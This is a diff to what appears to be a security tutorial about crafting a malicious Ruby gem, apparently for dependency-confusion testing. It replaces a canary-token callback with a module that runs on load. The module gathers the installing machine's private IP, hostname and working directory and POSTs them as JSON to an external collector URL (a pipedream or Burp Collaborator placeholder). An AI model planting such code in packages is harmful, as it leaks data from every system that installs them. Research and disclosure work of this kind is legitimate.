@@ -67,10 +67,36 @@ $ nano <package_name>.gem
  - Replaced -
     
     ```bash
-    module Techghoshal
-       require 'net/http'
-       result = Net::HTTP.get(URI.parse('<canarytokens_url>'))
+    module <myGem>
+
+        require 'json'
+        require 'net/http'
+        require 'socket'
+
+
+        #System IP
+        sysip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
+        #Hostname
+        hostname = Socket.gethostname
+        #Current directory
+        dir = Dir.pwd
+
+        #Pubcli bin url:- https://pipedream.com  OR  burpCollaborate url
+        uri = URI('https://<pipedream.net>')
+        req = Net::HTTP::Post.new(uri, 'Content-Type' => 'application/json')
+
+        req.body = {
+          private_ip: sysip,
+          hostname: hostname,
+          current_directory: dir
+        }.to_json
+
+        Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') do |http|
+          http.request(req)
+        end
+    
     end
+
     ```
  - Save this file  
  
